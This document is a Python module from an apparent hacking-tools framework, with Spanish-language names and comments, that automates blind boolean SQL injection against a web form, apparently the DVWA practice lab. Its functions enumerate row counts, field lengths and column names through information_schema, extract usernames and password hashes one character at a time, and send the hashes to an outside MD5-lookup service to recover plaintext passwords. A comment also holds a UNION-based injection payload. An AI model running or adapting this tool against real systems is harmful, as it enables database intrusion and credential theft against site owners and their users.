from colorama import init, Fore
import requests
import urllib
import json
import binascii

from hackingtools.core import Config
config = Config.getConfig(parentKey='modules', key='ht_sqlinjection')
config_dict = Config.getConfig(parentKey='core', key='utilities', subkey='dictionaries')
config_decrypt = Config.getConfig(parentKey='core', key='utilities', subkey='resources_cryptography_rest_api')

url = ''
cookie_session = ''
param_focus = ''
security = ''

url_md5_decrypt = config_decrypt['md5_decrypt']

class StartModule():

    def __init__(self):
        pass

    def setParams(self, url, param_focus, cookie='', proxies='', submit_name='', security=''):
        self.url = url
        self.cookie_session = cookie
        self.param_focus = param_focus
        self.proxies = proxies
        self.submit_name = submit_name
        self.security = security

    def color(self, texto, color):
        return '{iniColor}{texto}{finColor}'.format(iniColor=eval('Fore.{color}'.format(color=color)), texto=texto, finColor=Fore.WHITE)

    # Esta funcion hay que sacarla a una llamada a un modulo de criptografria
    def md5_decrypt(self, clave):
        clave_descifrada = ''
        r = requests.get(url = self.url_md5_decrypt, params = {'value': clave})
        if r.status_code == 200:
            datos = r.content.decode("utf-8")
            for d in datos:
                if not clave_descifrada and d in 'result':
                    actual = r.content.decode("utf-8")
                    json_acceptable_string = actual.replace("'", "\"")
                    d = json.loads(json_acceptable_string)
                    try:
                        if d and d['result']:
                            clave_descifrada = d['result']
                    except Exception as e:
                        pass
        return clave_descifrada

    def ejecutarSQL(self, sqli):
        try:
            if self.proxies:
                if self.submit_name:
                    result = requests.post(
                        url=self.url,
                        headers={'Content-Type':'application/x-www-form-urlencoded'},
                        cookies={'PHPSESSID' : self.cookie_session, 'security' : self.security},
                        proxies={'http' : self.proxies},
                        data={self.param_focus: sqli, self.submit_name: 'Submit'}
                    )
                else:
                    result = requests.post(
                        url=self.url,
                        headers={'Content-Type':'application/x-www-form-urlencoded'},
                        cookies={'PHPSESSID' : self.cookie_session, 'security' : self.security},
                        proxies={'http' : self.proxies},
                        data={self.param_focus: sqli}
                    )
            else:
                if self.submit_name:
                    result = requests.post(
                        url=self.url,
                        headers={'Content-Type':'application/x-www-form-urlencoded'},
                        cookies={'PHPSESSID':self.cookie_session, 'security':self.security},
                        #proxies={'http':'http://127.0.0.1:8080/'},
                        data={self.param_focus: sqli, self.submit_name: 'Submit'}
                    )
                else:
                    result = requests.post(
                        url=self.url,
                        headers={'Content-Type':'application/x-www-form-urlencoded'},
                        cookies={'PHPSESSID':self.cookie_session, 'security':self.security},
                        #proxies={'http':'http://127.0.0.1:8080/'},
                        data={self.param_focus: sqli}
                    )
            if result.status_code == 200:
                if 'ID exists' in result.text:
                    return True
                elif 'ID is MISSING' in result.text:
                    return False
                else:
                    print('[{asterisco}] - {mensaje} {sql}'.format(asterisco=self.color('*', config['color_error']), mensaje=self.color('Algo ha ido mal con tu sql', config['color_error']),  sql=sqli))
                    return False
            else:
                print('[{asterisco}] - {mensaje} {url} - {sqli}'.format(asterisco=self.color('*', config['color_error']), mensaje=self.color('URL mal formada...', config['color_error']), url=result.url, sqli=sqli))
                return False
        except Exception as e:
            print('[{asterisco}] - {mensaje} {error}'.format(asterisco=self.color('*', config['color_error']), mensaje=self.color('Excepcion... Que ha pasado?', config['color_error']), error=e))
            return False        

    def cantidadTuplasEnTapla(self, tabla, campo):
        result = 0
        for i in range(0, 100000):
            sentencia = "0 or {i} = (select count({campo}) from {tabla})".format(i=i, campo=campo, tabla=tabla)
            existe = self.ejecutarSQL(sentencia)
            if existe:
                result = i+1
                break
        return result

    def longitudCampoIDtablaCampo(self, id, tabla, campo, campoConocido):
        for i in range(1, 100):
            sentencia = "0 or exists(select {campo} from {tabla} where {campoConocido}={id} and length({campo}) = {i})".format(i=i+1, campo=campo, tabla=tabla, campoConocido=campoConocido, id=id)
            #print(sentencia)
            existe = self.ejecutarSQL(sentencia)
            if existe:
                return i+2
        return -1

    def cogerNombreDeTablaPorID(self, user, tabla, id, campoConocido):
        nombre = ''
        cantidad=self.longitudCampoIDtablaCampo(id, tabla, user, campoConocido)
        abecedario = config['lalpha']
        if 'password' in user:
            abecedario = config_dict['hex-lower']
        if cantidad > 0:
            print('[{asterisco}] - {titulo_tabla}: {tabla} {titulo_campo}: {campo} {titulo_longitud}: {cantidad} {campoConocido}: {id} {titulo_abecedario}: {abecedario}'.format(asterisco=self.color('*', config['color_verbose']), titulo_tabla=self.color('Tabla', config['color_verbose']), tabla=tabla, titulo_campo=self.color('Campo', config['color_verbose']), campo=user, titulo_longitud=self.color('Longitud', config['color_verbose']), cantidad=cantidad-1, campoConocido=self.color(campoConocido, config['color_verbose']), id=id, titulo_abecedario=self.color('Abecedario', config['color_verbose']), abecedario=abecedario))
            for j in range(1, cantidad): # Longitud de dicho nombre de user
                for i in range(0, len(abecedario)):
                    existe = self.ejecutarSQL("0 or exists(select {user} from {tabla} where user_id={id} and ASCII(substring({user}, {j}, 1))={i})".format(user=user, tabla=tabla, id=id, j=j, i=ord(abecedario[i])))
                    if existe:
                        nombre = '{nombre}{letra}'.format(nombre=nombre, letra=abecedario[i])
                        break
        else:
            print('[{asterisco}] - La longitud del campo {campo} es {longitud}'.format(asterisco=self.color('*', config['color_error']), campo=campoConocido, longitud=cantidad))
        return nombre

    def sacarValorPorTablaColumnaID(self, tabla, columna, nombre_campo_id):
        print('[{asterisco}] - Sacando datos de la tabla {tabla} de la columna {columna}'.format(asterisco=self.color('*', config['color_info']), tabla=tabla, columna=columna))
        contador_null = 0
        nombres = []
        cantidad_registros_en_tabla = self.cantidadTuplasEnTapla(tabla, columna)        
        if cantidad_registros_en_tabla > 0:
            print('[{asterisco}] - {mensaje} {num} {mensaje2} {tabla}'.format(asterisco=self.color('*', config['color_ok']), mensaje=self.color('Se han encontrado', config['color_ok']), num=cantidad_registros_en_tabla, mensaje2=self.color('registros en la tabla', config['color_ok']), tabla=tabla))
            for k in range(1, cantidad_registros_en_tabla): # Cantidad de tuplas en users
                datos = self.cogerNombreDeTablaPorID(columna, tabla, k, nombre_campo_id)
                if datos:
                    nombres.append(datos)
                else:
                    if contador_null == 1:
                        break
                    contador_null += 1
        else:
            print('[{asterisco}] - {mensaje}\tTabla: {tabla} - Columna: {columna} - Campo conocido: {nombre_campo_id}'.format(asterisco=self.color('*', config['color_error']), mensaje=self.color('No hay registros', config['color_error']), tabla=tabla, columna=columna, nombre_campo_id=nombre_campo_id))
        return nombres

    def compareTextExistWhereSubstringACII(self, tabla_name, table): # Devuelve : AND ASCII(substring) ... AND ... AND ASCII(substring)
        sentencia = ''
        for i in range(0, len(tabla_name)):
            sentencia = '{sentencia}AND ASCII(substring({tabla}, {i}, 1)) = {ascii} '.format(sentencia=sentencia, tabla=table.split(".")[1], i=i+1, ascii=ord(tabla_name[i]))
        return sentencia

    def transformAsciiToHex(self, ascii_text):
        datos = '0x'
        for letra in ascii_text:
            datos = '{datos}{nuevo}'.format(datos=datos, nuevo=hex(ord(letra))[2:])
        return datos

    def cogerColumnasTabla(self, tabla, tabla_name): # information_schema.columns, table_name
        nombres = []
        hexadecimal = self.transformAsciiToHex(tabla_name)
        sentencia_tabla_name = self.compareTextExistWhereSubstringACII(tabla_name, tabla)
        for k in range(1, 10):
            nombre = ''
            for i in range(1, 20):
                for j in range(0, len(config['lalpha'])):
                    if nombre:
                        nom = self.transformAsciiToHex(nombre)
                    else:
                        nom = self.transformAsciiToHex(config['lalpha'][j])
                    sentencia = "0 or substring((select group_concat(column_name) from {tabla} where table_schema=DATABASE() and table_name={hexadecimal}), {posicion}, 1)={comparacion}".format(comparacion=nom, tabla=tabla, posicion=i, hexadecimal=hexadecimal)
                    existe =  self.ejecutarSQL(sentencia)
                    if existe:
                        nombre = '{nombre}{letra}'.format(nombre=nombre, letra=config['lalpha'][j])
                        break
            if not nombre:
                break
            nombres.append(nombre)
        return nombres

    def cogerTablas(self):
        # 1' union all select table_schema,table_name FROM information_schema.tables WHERE table_schema != "mysql" AND table_schema != "information_schema" -- 
        pass

    def mostrarUserPass(self):
        nombres = self.sacarValorPorTablaColumnaID(tabla='users', columna='user', nombre_campo_id='user_id')
        password = self.sacarValorPorTablaColumnaID(tabla='users', columna='password', nombre_campo_id='user_id')
        contador = 0
        for passw in password:
            pass_dec = self.md5_decrypt(passw)
            print('[{asterisco}] - {titulo_user}: {user}\t- {titulo_passw}: {passw}\t- {titulo_password_limpia}: {pass_limpia}'.format(asterisco=self.color('*', config['color_ok']), titulo_user=self.color('User', config['color_ok']), user=self.color(nombres[contador], config['color_ok']), titulo_passw=self.color('Password', config['color_ok']), passw=self.color(passw, config['color_ok']), titulo_password_limpia=self.color('Password Limpia', config['color_ok']), pass_limpia=self.color(pass_dec, config['color_ok'])))
            contador += 1